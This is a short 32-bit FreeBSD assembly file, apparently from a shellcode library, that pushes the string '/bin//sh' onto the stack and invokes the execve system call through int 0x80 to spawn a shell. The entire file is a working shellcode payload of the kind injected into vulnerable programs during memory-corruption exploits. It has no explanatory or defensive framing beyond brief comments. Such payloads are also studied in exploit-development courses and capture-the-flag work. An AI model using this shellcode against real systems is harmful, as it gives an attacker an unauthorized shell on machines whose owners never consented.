        ;; EAX must be cleared upon entry
[BITS 32]
        %include "freebsd/32.asm"

        ;; Push '/bin//sh'
        push eax
        push `//sh`
        push `/bin`
        mov ebx, esp

        ;; Call execve
        push eax
        push esp
        push ebx
        mov al, SYS_execve
        push eax                ; Unused
        int 0x80
